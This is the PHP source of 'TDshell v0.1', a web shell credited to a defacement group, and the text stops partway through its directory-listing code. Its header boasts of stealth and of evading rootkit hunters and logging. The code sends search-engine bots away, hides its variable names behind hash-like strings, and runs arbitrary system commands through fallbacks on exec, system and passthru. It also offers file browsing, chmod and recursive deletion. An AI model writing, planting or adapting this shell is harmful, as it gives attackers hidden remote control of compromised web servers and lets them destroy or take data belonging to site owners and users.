/**
      _______ _          _____        __                   _
     |__   __| |        |  __ \      / _|                 | |
        | |  | |__   ___| |  | | ___| |_ __ _  ___ ___  __| |
        | |  | '_ \ / _ \ |  | |/ _ \  _/ _` |/ __/ _ \/ _` |
        | |  | | | |  __/ |__| |  __/ || (_| | (_|  __/ (_| |
        |_|  |_| |_|\___|_____/ \___|_| \__,_|\___\___|\__,_|

  _____                      _ _           _______
 / ____|                    (_) |         |__   __|
| (___   ___  ___ _   _ _ __ _| |_ _   _     | | ___  __ _ _ __ ___
 \___ \ / _ \/ __| | | | '__| | __| | | |    | |/ _ \/ _` | '_ ` _ \
 ____) |  __/ (__| |_| | |  | | |_| |_| |    | |  __/ (_| | | | | | |
|_____/ \___|\___|\__,_|_|  |_|\__|\__, |    |_|\___|\__,_|_| |_| |_|
                                    __/ |
                                   |___/
 __________________________________________________________________
 |------------------------[ TDshell v0.1 ]------------------------|
 |           [ © 2005 -> 2008 TheDefaced Security Team ]          |
/------------------------------------------------------------------\
\                                                                  /
 \      ___________________         .__           .__  .__        /
  \     \__    ___/\______ \   _____|  |__   ____ |  | |  |      /
   \      |    |    |    |  \ /  ___/  |  \_/ __ \|  | |  |     /
   /      |    |    |    `   \\___ \|   Y  \  ___/|  |_|  |__   \
  /       |____|   /_______  /____  >___|  /\___  >____/____/    \
  \                        \/     \/     \/     \/               /
   \____________________________________________________________/
   |                                                           |
   |------------------------[ CREDITS ]------------------------|
   |                                                           |
   | www.TheDefaced.org                                        |
   |     * DeadlyData                                          |
   |     * Debug                                               |
   |     * Kr3w                                                |
   |     * Tr3mbl3r                                            |
   |     * xaNax`                                              |
   |     * Blood420                                            |
    \                                                         /
     |#######################################################|
    /                                                         \
   |                                                           |
   |-----------------------[ FEATURES! ]-----------------------|
   |                                                           |
   | TDshell contains a lot of features. Mainly, TDshell was   |
   | developed to alleviate what other shells left behind.     |
   | Other shells can brag the ability to do this and that,    |
   | but in the end what makes a shell, a shell? We think a    |
   | shell should have stealth. It should be fast to load, use |
   | little memory, avoid logging from rootkit hunters, be     |
   | modern, and simply do exactly what you want it to do. The |
   | style must be simple. It should allow for the execution   |
   | of your commands, the implimentation of every feature     |
   | necessary with sleek control and seemless ability. Not    |
   | only does TDshell aim to be the most stealthiest, but the |
   | most powerful all-around shell ever created.              |
    \                                                         /
     |#######################################################|
    /                                                         \
   |------------------------[ HISTORY ]------------------------|
   |                                                           |
   | TDshell was created to impliment the look and feel that a |
   | shell should have, the features and speed that a shell    |
   | should have, and the endless limits of post-development   |
   | for everyone.                                             |
   |                                                           |
   | The core of TDshell is a strong shell processing system.  |
   | Yes, TDshell has object oriented elements, whether you    |
   | like it or not. It is extensive enough to have to include |
   | a system as such. The object oriented system within       |
   | does not include OOP Class Constructs and Features that   |
   | are not available with PHP 4. This is due to the fact     |
   | that many new features to OOP in PHP 5 were added, and to |
   | limit the version requirements of this shell such         |
   | features have not been implimented.                       |
   |                                                           |
   | TDshell will not log any activity using the shell. No     |
   | information regarding this shell location, queries, or    |
   | executions of code will be logged to another server.      |
    \                                                         /
     |#######################################################|
    /                                                         \
   |---------------------[ DOCUMENTATION ]---------------------|
   |                                                           |
   | Please review the documentation of TDshell at TheDefaced  |
   | TDshell Project Page on http://tdshell.thedefaced.org.    |
    \                                                         /
     |#######################################################|
    /                                                         \
   /___________________________________________________________\

**/

if (substr_count(strtolower($_SERVER['HTTP_USER_AGENT']), "bot"))
	{
		@header("Location: http://thedefaced.org/");
		exit;
	};

function current_URI()
	{
		$_42a6152a4d7c7d957669c6d70dc5ba87 = 'http';
		if ($_SERVER["HTTPS"] == "on")
			{
				$_42a6152a4d7c7d957669c6d70dc5ba87 .= "s";
			};
		$_42a6152a4d7c7d957669c6d70dc5ba87 .= "://";
		if ($_SERVER["SERVER_PORT"] != "80")
			{
				$_42a6152a4d7c7d957669c6d70dc5ba87 .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["SCRIPT_NAME"];
			}
		else
			{
				$_42a6152a4d7c7d957669c6d70dc5ba87 .= $_SERVER["SERVER_NAME"].$_SERVER["SCRIPT_NAME"];
			};
 		return $_42a6152a4d7c7d957669c6d70dc5ba87;
	};


function natsort2d(&$_6f3f41fdac2563c0cd2246cb5a507861) {
  $_8b950f1de0291b3d751c9073c331b045 = $_3abe5e58427863cb52d841b2e474b99d = array();
  foreach ($_6f3f41fdac2563c0cd2246cb5a507861 as $_4377314b1cecdbac9a384c43c42c6b48=>$_d52f547da0e098832b6b81469d36c48b) {
   reset($_d52f547da0e098832b6b81469d36c48b);
   $_8b950f1de0291b3d751c9073c331b045[$_4377314b1cecdbac9a384c43c42c6b48]=current($_d52f547da0e098832b6b81469d36c48b);
  }
  natsort($_8b950f1de0291b3d751c9073c331b045);
  foreach ($_8b950f1de0291b3d751c9073c331b045 as $_4377314b1cecdbac9a384c43c42c6b48=>$_d52f547da0e098832b6b81469d36c48b) {
   $_3abe5e58427863cb52d841b2e474b99d[$_4377314b1cecdbac9a384c43c42c6b48] = $_6f3f41fdac2563c0cd2246cb5a507861[$_4377314b1cecdbac9a384c43c42c6b48];
  }
  $_6f3f41fdac2563c0cd2246cb5a507861 = $_3abe5e58427863cb52d841b2e474b99d;
}

function getmicrotime()
	{ 
	    $_f1aa244866e1fc41fe62f3b7ccb03607 = split(" ",microtime()); 
	    $_1392ef521657c311e39af249669c5c4c = $_f1aa244866e1fc41fe62f3b7ccb03607[0] + $_f1aa244866e1fc41fe62f3b7ccb03607[1];
	    return $_1392ef521657c311e39af249669c5c4c;
	};

function view_size($_d01b1d6ca02250dd3186b3eb5feeca75) 
	{
		 if (!is_numeric($_d01b1d6ca02250dd3186b3eb5feeca75)) {return FALSE;} 
		 else 
			 { 
				  if ($_d01b1d6ca02250dd3186b3eb5feeca75 >= 1073741824) {$_d01b1d6ca02250dd3186b3eb5feeca75 = round($_d01b1d6ca02250dd3186b3eb5feeca75/1073741824*100)/100 ." GB";} 
				  elseif ($_d01b1d6ca02250dd3186b3eb5feeca75 >= 1048576) {$_d01b1d6ca02250dd3186b3eb5feeca75 = round($_d01b1d6ca02250dd3186b3eb5feeca75/1048576*100)/100 ." MB";} 
				  elseif ($_d01b1d6ca02250dd3186b3eb5feeca75 >= 1024) {$_d01b1d6ca02250dd3186b3eb5feeca75 = round($_d01b1d6ca02250dd3186b3eb5feeca75/1024*100)/100 ." KB";} 
				  else {$_d01b1d6ca02250dd3186b3eb5feeca75 = $_d01b1d6ca02250dd3186b3eb5feeca75 . " B";} 
				  return $_d01b1d6ca02250dd3186b3eb5feeca75;
			 } 
	};
if ( !function_exists('htmlspecialchars_decode') )
	{
	    function htmlspecialchars_decode($_33343500153dd2bfdb71207b3a2efb0b)
	    {
	        return strtr($_33343500153dd2bfdb71207b3a2efb0b, array_flip(get_html_translation_table(HTML_SPECIALCHARS)));
	    };
	};

function processdir($_2211b5dc6bb7947adcb0bf14cee6591e)
	{
		$_2211b5dc6bb7947adcb0bf14cee6591e = @realpath($_2211b5dc6bb7947adcb0bf14cee6591e);
		$_2211b5dc6bb7947adcb0bf14cee6591e = @explode(DIRECTORY_SEPARATOR, $_2211b5dc6bb7947adcb0bf14cee6591e);
		$_2211b5dc6bb7947adcb0bf14cee6591e = @array_reverse($_2211b5dc6bb7947adcb0bf14cee6591e);
		foreach ($_2211b5dc6bb7947adcb0bf14cee6591e as $_120c29d6a17d23d38cf83c73ee28474a => $_dbb9cf7861c2b08674858b1c5ed255d3)
			{
				$_4015b8ddbb3792b7cea9b691c444f9bb = @implode(DIRECTORY_SEPARATOR, @array_reverse($_2211b5dc6bb7947adcb0bf14cee6591e));
				$_a9e5405d6581811dbff46e9ca3280bc1[] = $GLOBALS['TDshell']->make_link("list", array("dir" => $_4015b8ddbb3792b7cea9b691c444f9bb . DIRECTORY_SEPARATOR), @htmlspecialchars($_dbb9cf7861c2b08674858b1c5ed255d3) . DIRECTORY_SEPARATOR);
				unset($_2211b5dc6bb7947adcb0bf14cee6591e[$_120c29d6a17d23d38cf83c73ee28474a]);
			};
		$_a9e5405d6581811dbff46e9ca3280bc1 = @array_reverse($_a9e5405d6581811dbff46e9ca3280bc1);
		$_a9e5405d6581811dbff46e9ca3280bc1 = @implode("", $_a9e5405d6581811dbff46e9ca3280bc1);
		return $_a9e5405d6581811dbff46e9ca3280bc1;
	};
if (!@function_exists("htmlspecialchars_decode")) {
    function htmlspecialchars_decode($_5fa3317a9a640ed74c5f9247474ed574, $_59588925eec423f30d40b21b1ed1668e = ENT_COMPAT) {
        return strtr($_5fa3317a9a640ed74c5f9247474ed574, array_flip(get_html_translation_table(HTML_SPECIALCHARS, $_59588925eec423f30d40b21b1ed1668e)));
    };
};

function delete_directory($_03bc224b8d2f7aeadafb2048d91c8f5e)  {
        $_82c6138b62efd9e0b5bd91204b1d854b  =  @opendir($_03bc224b8d2f7aeadafb2048d91c8f5e);
        while(($_3de8e09f12e75d6214bb6e7720875bf2  =  @readdir($_82c6138b62efd9e0b5bd91204b1d854b)) !== FALSE)  {
            if  ($_3de8e09f12e75d6214bb6e7720875bf2  !=  "."  &&  $_3de8e09f12e75d6214bb6e7720875bf2  !=  "..")  {
                if  (!@is_dir($_03bc224b8d2f7aeadafb2048d91c8f5e."/".$_3de8e09f12e75d6214bb6e7720875bf2))
                        @unlink($_03bc224b8d2f7aeadafb2048d91c8f5e."/".$_3de8e09f12e75d6214bb6e7720875bf2);
                else
                        delete_directory($_03bc224b8d2f7aeadafb2048d91c8f5e.'/'.$_3de8e09f12e75d6214bb6e7720875bf2);                       
            }
        }
        @closedir($_82c6138b62efd9e0b5bd91204b1d854b);
        if (@rmdir($_03bc224b8d2f7aeadafb2048d91c8f5e))
        	{
				return true;
			};
        return false;
};

function is_disabled($_d24fdc60af9ffefb892a8c20a6f28f0f) {
  $_3f595d48284da121e82e9fba50f8ae78=@explode(',',@ini_get('disable_functions'));
  return @in_array($_d24fdc60af9ffefb892a8c20a6f28f0f, $_3f595d48284da121e82e9fba50f8ae78);
}

function custom_exec($_43b464f69048e498f740f7449de30b58)
	{
		if (!is_disabled("exec"))
			{
				@exec($_43b464f69048e498f740f7449de30b58, $_c378b53352ff491652530ac000f8d120);
				return @implode("\n", $_c378b53352ff491652530ac000f8d120);
			}
		elseif (!is_disabled("system"))
			{
				@ob_start();
				@system($_43b464f69048e498f740f7449de30b58);
				$_a9e5405d6581811dbff46e9ca3280bc1 = @ob_get_clean();
				return $_a9e5405d6581811dbff46e9ca3280bc1;
			}
		elseif (!is_disabled("passthru"))
			{
				@ob_start();
				@passthru($_43b464f69048e498f740f7449de30b58);
				$_a9e5405d6581811dbff46e9ca3280bc1 = @ob_get_clean();
				return $_a9e5405d6581811dbff46e9ca3280bc1;	
			}
		else
			{
				return FALSE;
			}
	}

function listDir($_2211b5dc6bb7947adcb0bf14cee6591e)
	{
		$_7924ccf53d944b2d8320d10d54548e29 = array();
		$_ae816068878d4783e70eeef9284475f4 = array();
		$_fd614daccd49afd7833e083628860ad5 = array();
		
		$_c14f19c15d50e72a5733c0ad88a035b9 = @opendir($_2211b5dc6bb7947adcb0bf14cee6591e);
		while (($_b6525f529051ff28fa112494d8e2d5a3 = @readdir($_c14f19c15d50e72a5733c0ad88a035b9)) !== FALSE)
			{
				$_d69e2bdf98584fc6cce9c9f9a9eb8b6a[] = $_b6525f529051ff28fa112494d8e2d5a3;
			};
		@closedir($_c14f19c15d50e72a5733c0ad88a035b9);
				foreach ($_d69e2bdf98584fc6cce9c9f9a9eb8b6a as $_e702a6d41125002051486e5e72b66d74)
			{
				if ($_e702a6d41125002051486e5e72b66d74 == ".")
					{
						$_ae816068878d4783e70eeef9284475f4[] = $_2211b5dc6bb7947adcb0bf14cee6591e . "." . DIRECTORY_SEPARATOR;
					}
				elseif ($_e702a6d41125002051486e5e72b66d74 == "..")
					{
						$_ae816068878d4783e70eeef9284475f4[] = $_2211b5dc6bb7947adcb0bf14cee6591e . ".." . DIRECTORY_SEPARATOR;
					}
				elseif (@is_dir($_2211b5dc6bb7947adcb0bf14cee6591e . $_e702a6d41125002051486e5e72b66d74))
					{
						if (@is_link($_e702a6d41125002051486e5e72b66d74))
							{
								$_ae816068878d4783e70eeef9284475f4[] = $_2211b5dc6bb7947adcb0bf14cee6591e . $_e702a6d41125002051486e5e72b66d74 . DIRECTORY_SEPARATOR;
							}
						else
							{
								$_fd614daccd49afd7833e083628860ad5[] = $_2211b5dc6bb7947adcb0bf14cee6591e . $_e702a6d41125002051486e5e72b66d74 . DIRECTORY_SEPARATOR;
							};
					}
				elseif (@is_file($_2211b5dc6bb7947adcb0bf14cee6591e . $_e702a6d41125002051486e5e72b66d74))
					{
						$_7924ccf53d944b2d8320d10d54548e29[] = $_2211b5dc6bb7947adcb0bf14cee6591e . $_e702a6d41125002051486e5e72b66d74;
					}
				else
					{
						$_ae816068878d4783e70eeef9284475f4[] = $_2211b5dc6bb7947adcb0bf14cee6591e . $_e702a6d41125002051486e5e72b66d74;
					};
			};
		foreach ($_7924ccf53d944b2d8320d10d54548e29 as $_4377314b1cecdbac9a384c43c42c6b48 => $_3de8e09f12e75d6214bb6e7720875bf2)
			{
				$_86cc5dffb9c95119ecd61c5ce2502cbc[@htmlspecialchars(@basename($_3de8e09f12e75d6214bb6e7720875bf2))] = @realpath($_3de8e09f12e75d6214bb6e7720875bf2);
			};
		foreach ($_fd614daccd49afd7833e083628860ad5 as $_4377314b1cecdbac9a384c43c42c6b48 => $_2211b5dc6bb7947adcb0bf14cee6591e)
			{
				$_929bdda99ead5652737dc2edefe9b0c4[@htmlspecialchars(@basename($_2211b5dc6bb7947adcb0bf14cee6591e))] = @realpath($_2211b5dc6bb7947adcb0bf14cee6591e);
			};
		foreach ($_ae816068878d4783e70eeef9284475f4 as $_4377314b1cecdbac9a384c43c42c6b48 => $_74bd500a4b44ea6a823f6199ccdb62a8)
			{
				$_022d200e9529826ec8ed110a68478d28[@htmlspecialchars(@basename($_74bd500a4b44ea6a823f6199ccdb62a8))] = @realpath($_74bd500a4b44ea6a823f6199ccdb62a8);
			};
		@natsort($_86cc5dffb9c95119ecd61c5ce2502cbc);
		@natsort($_929bdda99ead5652737dc2edefe9b0c4);
		@natsort($_022d200e9529826ec8ed110a68478d28);
		return array("FILES" => $_86cc5dffb9c95119ecd61c5ce2502cbc, "DIRS" => $_929bdda99ead5652737dc2edefe9b0c4, "LINKS" => $_022d200e9529826ec8ed110a68478d28);
	}

function recursiveDirectoryResponse($_2211b5dc6bb7947adcb0bf14cee6591e)
	{
		$_2211b5dc6bb7947adcb0bf14cee6591e = @realpath($_2211b5dc6bb7947adcb0bf14cee6591e);
		if (!@is_dir($_2211b5dc6bb7947adcb0bf14cee6591e))
			{
				return FALSE;
			};
		$_c14f19c15d50e72a5733c0ad88a035b9 = @opendir($_2211b5dc6bb7947adcb0bf14cee6591e);
		$_35822b5d3e252c2cd76a8cfd0bc9215b = array();
		while (($_b6525f529051ff28fa112494d8e2d5a3 = @readdir($_c14f19c15d50e72a5733c0ad88a035b9)) !== FALSE)
			{
				if ($_b6525f529051ff28fa112494d8e2d5a3 !== "." && $_b6525f529051ff28fa112494d8e2d5a3 !== "..")
					{
						if (@is_dir($_b6525f529051ff28fa112494d8e2d5a3) && !isset($_35822b5d3e252c2cd76a8cfd0bc9215b[$_b6525f529051ff28fa112494d8e2d5a3 . DIRECTORY_SEPARATOR]))
							{
								$_35822b5d3e252c2cd76a8cfd0bc9215b[$_b6525f529051ff28fa112494d8e2d5a3 . DIRECTORY_SEPARATOR] = recursiveDirectoryResponse($_b6525f529051ff28fa112494d8e2d5a3);
							}
						else
							{
								$_35822b5d3e252c2cd76a8cfd0bc9215b[] = $_b6525f529051ff28fa112494d8e2d5a3;
							};
					};
			};
		return $_35822b5d3e252c2cd76a8cfd0bc9215b;
	}

function file_perms($_3de8e09f12e75d6214bb6e7720875bf2, $_7c6634f9e5e8cd23040778e99232dff3 = false)
{
    if(!@file_exists($_3de8e09f12e75d6214bb6e7720875bf2)) return false;

    $_13f531c0ca48f6a5f8315121bf59ffaa = @fileperms($_3de8e09f12e75d6214bb6e7720875bf2);

    $_cbc4b619c09cd3060d1699bd1b6ec197 = $_7c6634f9e5e8cd23040778e99232dff3 ? 2 : 3;

    return @substr(@decoct($_13f531c0ca48f6a5f8315121bf59ffaa), $_cbc4b619c09cd3060d1699bd1b6ec197);
}

function view_perms($_65fa4fdb4dc96ba9c4f2629446b1acf9) 
{ 
 if (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0xC000) === 0xC000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "s";} 
 elseif (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x4000) === 0x4000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "d";} 
 elseif (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0xA000) === 0xA000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "l";} 
 elseif (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x8000) === 0x8000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "-";} 
 elseif (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x6000) === 0x6000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "b";} 
 elseif (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x2000) === 0x2000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "c";} 
 elseif (($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x1000) === 0x1000) {$_78f05392f016a05e28dc87c1d3bd52a2 = "p";} 
 else {$_78f05392f016a05e28dc87c1d3bd52a2 = "?";} 
 $_08a8bc95aa954433522d6e8773049cbc["read"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00400)?"r":"-"; 
 $_08a8bc95aa954433522d6e8773049cbc["write"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00200)?"w":"-"; 
 $_08a8bc95aa954433522d6e8773049cbc["execute"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00100)?"x":"-"; 
 $_aeaf1179391a94c353c7eb37a0e3ec8b["read"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00040)?"r":"-"; 
 $_aeaf1179391a94c353c7eb37a0e3ec8b["write"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00020)?"w":"-"; 
 $_aeaf1179391a94c353c7eb37a0e3ec8b["execute"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00010)?"x":"-"; 
 $_be187a6755c5e72374d46fcbc1c4fe57["read"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00004)?"r":"-"; 
 $_be187a6755c5e72374d46fcbc1c4fe57["write"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00002)? "w":"-"; 
 $_be187a6755c5e72374d46fcbc1c4fe57["execute"] = ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 00001)?"x":"-"; 
 if ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x800) {$_08a8bc95aa954433522d6e8773049cbc["execute"] = ($_08a8bc95aa954433522d6e8773049cbc["execute"] == "x")?"s":"S";} 
 if ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x400) {$_aeaf1179391a94c353c7eb37a0e3ec8b["execute"] = ($_aeaf1179391a94c353c7eb37a0e3ec8b["execute"] == "x")?"s":"S";} 
 if ($_65fa4fdb4dc96ba9c4f2629446b1acf9 & 0x200) {$_be187a6755c5e72374d46fcbc1c4fe57["execute"] = ($_be187a6755c5e72374d46fcbc1c4fe57["execute"] == "x")?"t":"T";} 
 return $_78f05392f016a05e28dc87c1d3bd52a2.join("",$_08a8bc95aa954433522d6e8773049cbc).join("",$_aeaf1179391a94c353c7eb37a0e3ec8b).join("",$_be187a6755c5e72374d46fcbc1c4fe57); 
} 

function view_perms_color($_3bf3fbc5fc401a716348815f5e794920) 
{ 
 if (!@is_readable($_3bf3fbc5fc401a716348815f5e794920)) {return "<font color=red>".view_perms(@fileperms($_3bf3fbc5fc401a716348815f5e794920))."</font>";} 
 elseif (!@is_writable($_3bf3fbc5fc401a716348815f5e794920)) {return "<font color=white>".view_perms(@fileperms($_3bf3fbc5fc401a716348815f5e794920))."</font>";} 
 else {return "<font color=green>".view_perms(@fileperms($_3bf3fbc5fc401a716348815f5e794920))."</font>";} 
} 

Class _463f641c8747ebe94fafef7333a99b45
	{
		var $TDshell_version = "TDshell v0.1 - Beta";
		var $TDshell_template = array();
		var $TDshell_data = "";
		var $TDshell_time_start = "";
		var $TDshell_time_end = "";
		
		function init()
			{
								$_a3ae37119660c8023a43787f58268912 = $_GET['proc'];
				unset($_GET['proc']);
								$_2e5c25529adea7d7ad4802936aee0b48 = $_GET['act'];
				unset($_GET['act']);
				$this->TDshell_time_start = getmicrotime();
				if ($_a3ae37119660c8023a43787f58268912 != "out")
					{
						$this->header();
					}
				if (!empty($_GET['args']))
					{
						$_ec4ae32bf3e3a09bae7ff3e84ebbc667 = $_GET['args'];
						$_ec4ae32bf3e3a09bae7ff3e84ebbc667 = @explode("-", $_ec4ae32bf3e3a09bae7ff3e84ebbc667);
						foreach ($_ec4ae32bf3e3a09bae7ff3e84ebbc667 as $_f16aff67f7495b01405d8cd6181766f0)
							{
								list($_d3befca3813d65aff84c2353e705a0dd, $_dd5a91d0c375489fc194ecfe1da2e38a) = @explode(":", @base64_decode($_f16aff67f7495b01405d8cd6181766f0), 2);
								$_8cc898f326427ea2223c7150e5b6537c[$_d3befca3813d65aff84c2353e705a0dd] = $_dd5a91d0c375489fc194ecfe1da2e38a;
							};
						$this->process($_2e5c25529adea7d7ad4802936aee0b48, $_8cc898f326427ea2223c7150e5b6537c);
					}
				else
					{
						$this->process($_2e5c25529adea7d7ad4802936aee0b48);
					};
				$this->TDshell_time_end = getmicrotime();
				if ($_a3ae37119660c8023a43787f58268912 != "out")
					{
						$this->footer("" . $this->TDshell_time_end - $this->TDshell_time_start . "");
					}
				$this->outall();
			}
		
		function process($_2e5c25529adea7d7ad4802936aee0b48 = "", $_ec4ae32bf3e3a09bae7ff3e84ebbc667 = array())
			{
				switch($_2e5c25529adea7d7ad4802936aee0b48)
					{
						case "list":
							$_2211b5dc6bb7947adcb0bf14cee6591e = $_ec4ae32bf3e3a09bae7ff3e84ebbc667['dir'];
							if (empty($_2211b5dc6bb7947adcb0bf14cee6591e))
								{
									$this->process("list", array("dir" => "." . DIRECTORY_SEPARATOR));
									return FALSE;
								};

							if (!@is_dir($_2211b5dc6bb7947adcb0bf14cee6591e))
								{
									$this->out("Problem listing directory; directory does not exist or cannot be read from.");
									return FALSE;
								};
							$_8e1c807f3c845b208dba4430e64f4d94 = listDir($_2211b5dc6bb7947adcb0bf14cee6591e);
							$this->out("<b>" . processdir($_2211b5dc6bb7947adcb0bf14cee6591e) . "&nbsp;&nbsp;&nbsp;" . view_perms_color($_2211b5dc6bb7947adcb0bf14cee6591e) . "</b><br>");
							$this->out("<center><span style='font-size:12px'><b>Listing " . @count($_8e1c807f3c845b208dba4430e64f4d94['DIRS']) . " directories and " . @count($_8e1c807f3c845b208dba4430e64f4d94['FILES']) . " files.</b></span></center>");
							if (empty($_8e1c807f3c845b208dba4430e64f4d94['LINKS']))
								{
									$this->out("Problem listing directory; directory does not exist or cannot be read from.");
									return FALSE;
								};
							$this->out("<table width=100% padding=1>
	<tr>
		<th nowrap>
			Name		
		</th>
		<th nowrap>
			Size		
		</th>
		<th nowrap>
			Modified		
		</th>
		<th nowrap>
			Owner|Group		
		</th>
		<th nowrap>
			Permissions		
		</th>
		<th nowrap>	
			Action		
		</th>
	</tr>");
							if (@is_array($_8e1c807f3c845b208dba4430e64f4d94['LINKS']))
							foreach ($_8e1c807f3c845b208dba4430e64f4d94['LINKS'] as $_a70fd9147fda16858f57fe0479d66df0 => $_bf765329c68fb45566ab3b1af145d2c2)
								{
									$this->out("<tr>");
									$this->out("<td><b>" . $this->make_link("list", array("dir" => $_bf765329c68fb45566ab3b1af145d2c2 . DIRECTORY_SEPARATOR), $_a70fd9147fda16858f57fe0479d66df0) . "</b></td>");
									$this->out("<td>LINK</td>");
									     $_ca3b4c9ef3a45b7d6dc6af03bad1367b = @posix_getpwuid(@fileowner($_bf765329c68fb45566ab3b1af145d2c2));
										 $_35b2f08320a2169a648d2377cae768d3 = @posix_getgrgid(@filegroup($_bf765329c68fb45566ab3b1af145d2c2));
										 $_ca3b4c9ef3a45b7d6dc6af03bad1367b = $_ca3b4c9ef3a45b7d6dc6af03bad1367b["name"];
										 $_35b2f08320a2169a648d2377cae768d3 = $_35b2f08320a2169a648d2377cae768d3["name"];
									$this->out("<td>" . @date ("F d Y H:i:s.", @filemtime($_bf765329c68fb45566ab3b1af145d2c2)) . "</td>");
									$this->out("<td>$_ca3b4c9ef3a45b7d6dc6af03bad1367b|$_35b2f08320a2169a648d2377cae768d3</td>");
									$this->out("<td><span title='" . @substr(@decoct(@fileperms($_bf765329c68fb45566ab3b1af145d2c2)),-4,4) . "'>" . $this->make_link("dir", array("name" => $_bf765329c68fb45566ab3b1af145d2c2, "act" => "chmod"), view_perms_color($_bf765329c68fb45566ab3b1af145d2c2)) . "</span></td>");
									$this->out("<td>" . $this->make_link("dir", array("name" => $_bf765329c68fb45566ab3b1af145d2c2, "act" => "info"), "[info]") . " - " . $this->make_link("dir", array("name" => $_bf765329c68fb45566ab3b1af145d2c2, "act" => "chmod"), "[chmod]") . " - " . $this->make_link("dir", array("name" => $_bf765329c68fb45566ab3b1af145d2c2, "act" => "delete"), "[delete]") . "</td>");
									$this->out("</tr>");
								}
							if (@is_array($_8e1c807f3c845b208dba4430e64f4d94['DIRS']))
							foreach ($_8e1c807f3c845b208dba4430e64f4d94['DIRS'] as $_23e43c1054e39145ffd2c948f87f107c => $_b52f6a3170e004ef525cff1e536b7427)
								{
									$this->out("<tr>");
									$this->out("<td><b>[" . $this->make_link("list", array("dir" => $_b52f6a3170e004ef525cff1e536b7427 . DIRECTORY_SEPARATOR), $_23e43c1054e39145ffd2c948f87f107c) . "]</b></td>");
									$this->out("<td>" . view_size(@filesize($_b52f6a3170e004ef525cff1e536b7427)) . "</td>");
									     $_a7fcd5fac3ae867f8cdb4eb46a683477 = @posix_getpwuid(@fileowner($_b52f6a3170e004ef525cff1e536b7427));
										 $_82e66704cd450201cf5168d64d52a4d3 = @posix_getgrgid(@filegroup($_b52f6a3170e004ef525cff1e536b7427));
										 $_a7fcd5fac3ae867f8cdb4eb46a683477 = $_a7fcd5fac3ae867f8cdb4eb46a683477["name"];
										 $_82e66704cd450201cf5168d64d52a4d3 = $_82e66704cd450201cf5168d64d52a4d3["name"];
									$this->out("<td>" . @date ("F d Y H:i:s.", @filemtime($_b52f6a3170e004ef525cff1e536b7427)) . "</td>");
									$this->out("<td>$_a7fcd5fac3ae867f8cdb4eb46a683477|$_82e66704cd450201cf5168d64d52a4d3</td>");
									$this->out("<td><span title='" . @substr(@decoct(@fileperms($_b52f6a3170e004ef525cff1e536b7427)),-4,4) . "'>" . $this->make_link("dir", array("name" => $_b52f6a3170e004ef525cff1e536b7427, "act" => "chmod"), view_perms_color($_b52f6a3170e004ef525cff1e536b7427)) . "</span></td>");
									$this->out("<td>" . $this->make_link("dir", array("name" => $_b52f6a3170e004ef525cff1e536b7427, "act" => "info"), "[info]") . " - " . $this->make_link("dir", array("name" => $_b52f6a3170e004ef525cff1e536b7427, "act" => "chmod"), "[chmod]") . " - " . $this->make_link("dir", array("name" => $_b52f6a3170e004ef525cff1e536b7427, "act" => "delete"), "[delete]") . "</td>");
									$this->out("</tr>");
								}
							if (@is_array($_8e1c807f3c845b208dba4430e64f4d94['FILES']))
							foreach ($_8e1c807f3c845b208dba4430e64f4d94['FILES'] as $_0136b647df83da4bb9a70b41420d9e05 => $_f3f7e9f4a6ad2cc07b147484d501377d)
								{
									$_ed02210e63e304003de8ccd669607668 = view_size(@filesize($_f3f7e9f4a6ad2cc07b147484d501377d));
									$_8501d6dd59b45b2159f1f73f6e17b11f = @md5(microtime() . $_0136b647df83da4bb9a70b41420d9e05);
									$this->out("<tr>");
									$this->out("<td><b><span title='$_0136b647df83da4bb9a70b41420d9e05 - Size: " . $_ed02210e63e304003de8ccd669607668 . "'>" . $this->make_link("file", array("name" => $_f3f7e9f4a6ad2cc07b147484d501377d, "act" => "view"), $_0136b647df83da4bb9a70b41420d9e05). "</span></b></td>");
									$this->out("<td>" . $_ed02210e63e304003de8ccd669607668 . "</td>");
									     $_d2f5e3cb12e93bae6c4981faf06db693 = @posix_getpwuid(@fileowner($_f3f7e9f4a6ad2cc07b147484d501377d));
										 $_048403d36ad14f408d11cb9c81b09d29 = @posix_getgrgid(@filegroup($_f3f7e9f4a6ad2cc07b147484d501377d));
										 $_d2f5e3cb12e93bae6c4981faf06db693 = $_d2f5e3cb12e93bae6c4981faf06db693["name"];
										 $_048403d36ad14f408d11cb9c81b09d29 = $_048403d36ad14f408d11cb9c81b09d29["name"];
									$this->out("<td>" . @date ("F d Y H:i:s.", @filemtime($_f3f7e9f4a6ad2cc07b147484d501377d)) . "</td>");
									$this->out("<td>$_d2f5e3cb12e93bae6c4981faf06db693|$_048403d36ad14f408d11cb9c81b09d29</td>");
									$this->out("<td><span title='" . @substr(@decoct(@fileperms($_f3f7e9f4a6ad2cc07b147484d501377d)),-4,4) . "'>" . $this->make_link("file", array("name" => $_f3f7e9f4a6ad2cc07b147484d501377d, "act" => "chmod"), view_perms_color($_f3f7e9f4a6ad2cc07b147484d501377d)) . "</span></td>");
									$_55b73f20aeec06c5111b6ba95bf29532 = @md5_file($_f3f7e9f4a6ad2cc07b147484d501377d);
